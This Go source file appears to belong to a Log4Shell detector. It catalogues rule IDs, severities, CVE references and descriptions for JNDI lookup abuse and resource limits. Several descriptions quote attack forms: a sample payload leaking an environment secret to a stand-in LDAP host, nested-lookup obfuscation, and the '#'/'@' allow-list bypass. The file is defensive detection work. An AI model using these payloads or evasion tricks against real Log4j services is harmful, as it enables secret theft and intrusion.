package engine

import "slices"

// RuleID identifies a detection rule. IDs are stable: they appear in logs,
// metrics, and operator configuration, so they are never reused or renumbered.
type RuleID string

// Rule identifiers. Ranges: 1xxx JNDI abuse, 2xxx other lookup abuse, 3xxx
// resource budgets.
const (
	// RuleJNDI is a JNDI lookup written out plainly.
	RuleJNDI RuleID = "LSH-1001"
	// RuleJNDIEvasive is a JNDI lookup that needed decoding or nested lookups to
	// reveal: evidence of deliberate evasion.
	RuleJNDIEvasive RuleID = "LSH-1002"
	// RuleJNDIPossible is a lookup whose prefix would be "jndi" for some value
	// of an environment-dependent unknown.
	RuleJNDIPossible RuleID = "LSH-1003"
	// RuleJNDIExfil is a JNDI lookup whose key embeds environment-dependent
	// lookups, which leaks their values to the attacker's server.
	RuleJNDIExfil RuleID = "LSH-1004"
	// RuleJNDIHostBypass is a JNDI lookup whose authority uses '#' or '@' tricks
	// to defeat host allow-lists.
	RuleJNDIHostBypass RuleID = "LSH-1005"

	// RuleLookupDepth is deeply nested lookup syntax.
	RuleLookupDepth RuleID = "LSH-2001"
	// RuleLookupSyntax is a non-JNDI Log4j lookup in untrusted input.
	RuleLookupSyntax RuleID = "LSH-2002"
	// RuleLookupObfuscated is a lookup whose name is built by nested lookups.
	RuleLookupObfuscated RuleID = "LSH-2003"

	// RuleDecodeBudget means decoding hit a resource limit.
	RuleDecodeBudget RuleID = "LSH-3001"
	// RuleResolveBudget means lookup resolution hit a resource limit.
	RuleResolveBudget RuleID = "LSH-3002"
	// RuleRequestBudget means the request as a whole hit a resource limit.
	RuleRequestBudget RuleID = "LSH-3003"
)

// Severity ranks a detection.
type Severity int

// Severities.
const (
	// SeveritySuspicious is unusual in legitimate traffic but not proof of an attack.
	SeveritySuspicious Severity = iota + 1
	// SeverityMalicious is an attack, or an input the engine refuses to analyze.
	SeverityMalicious
)

// String returns a stable identifier.
func (s Severity) String() string {
	switch s {
	case SeveritySuspicious:
		return "suspicious"
	case SeverityMalicious:
		return "malicious"
	default:
		return "unknown"
	}
}

// RuleInfo documents a rule.
type RuleInfo struct {
	ID          RuleID
	Name        string
	Severity    Severity
	CVEs        []string
	Description string
	// Mandatory rules cannot be disabled: they are the fail-closed budget checks.
	Mandatory bool
}

var catalogue = []RuleInfo{
	{
		ID: RuleJNDI, Name: "jndi-lookup", Severity: SeverityMalicious,
		CVEs:        []string{"CVE-2021-44228"},
		Description: "A ${jndi:...} lookup, written plainly, in a request field.",
	},
	{
		ID: RuleJNDIEvasive, Name: "jndi-lookup-evasive", Severity: SeverityMalicious,
		CVEs:        []string{"CVE-2021-44228"},
		Description: "A JNDI lookup revealed only by decoding the field or evaluating nested lookups (for example ${${lower:j}ndi:...} or a percent-encoded payload).",
	},
	{
		ID: RuleJNDIPossible, Name: "jndi-lookup-possible", Severity: SeveritySuspicious,
		CVEs:        []string{"CVE-2021-44228"},
		Description: "A lookup whose prefix would be \"jndi\" if an environment-dependent nested lookup (env, sys, ...) supplied the right characters.",
	},
	{
		ID: RuleJNDIExfil, Name: "jndi-key-exfiltration", Severity: SeverityMalicious,
		CVEs:        []string{"CVE-2021-44228"},
		Description: "A JNDI key that embeds environment-dependent lookups, such as ${jndi:ldap://${env:SECRET}.example.invalid/a}, which leaks their values over DNS or LDAP without code execution.",
	},
	{
		ID: RuleJNDIHostBypass, Name: "jndi-host-allowlist-bypass", Severity: SeverityMalicious,
		CVEs:        []string{"CVE-2021-45046"},
		Description: "A JNDI key whose authority contains '#' or '@', the trick used to defeat the host allow-list added in Log4j 2.15.0.",
	},
	{
		ID: RuleLookupDepth, Name: "lookup-deep-nesting", Severity: SeveritySuspicious,
		CVEs:        []string{"CVE-2021-45105"},
		Description: "Lookups nested deeply enough to suggest the uncontrolled-recursion denial of service rather than ordinary use.",
	},
	{
		ID: RuleLookupSyntax, Name: "log4j-lookup-in-input", Severity: SeveritySuspicious,
		CVEs:        []string{"CVE-2021-44228"},
		Description: "A non-JNDI Log4j lookup (env, sys, java, ctx, lower, upper, date, ...) in untrusted input. These have no business in a request and are the building blocks of obfuscation and data leaks.",
	},
	{
		ID: RuleLookupObfuscated, Name: "lookup-name-built-by-lookups", Severity: SeveritySuspicious,
		CVEs:        []string{"CVE-2021-44228"},
		Description: "A lookup whose name is assembled by nested lookups, which is an obfuscation technique with no legitimate use in request data.",
	},
	{
		ID: RuleDecodeBudget, Name: "decode-budget-exceeded", Severity: SeverityMalicious, Mandatory: true,
		Description: "Decoding a field exceeded a resource limit (input size, encoding depth, variants, or size). Treated as hostile: fail-closed.",
	},
	{
		ID: RuleResolveBudget, Name: "resolve-budget-exceeded", Severity: SeverityMalicious, Mandatory: true,
		Description: "Evaluating lookups in a field exceeded a resource limit (nesting, lookup count, or size). Treated as hostile: fail-closed.",
	},
	{
		ID: RuleRequestBudget, Name: "request-budget-exceeded", Severity: SeverityMalicious, Mandatory: true,
		Description: "The request exceeded a whole-request limit (bytes, number of fields, or total decoded work). Treated as hostile: fail-closed.",
	},
}

// Rules returns the rule catalogue in a stable order. The caller may modify the
// returned slice.
func Rules() []RuleInfo {
	out := make([]RuleInfo, len(catalogue))
	for i, r := range catalogue {
		r.CVEs = slices.Clone(r.CVEs)
		out[i] = r
	}
	return out
}

func ruleInfo(id RuleID) (RuleInfo, bool) {
	for _, r := range catalogue {
		if r.ID == id {
			return r, true
		}
	}
	return RuleInfo{}, false
}
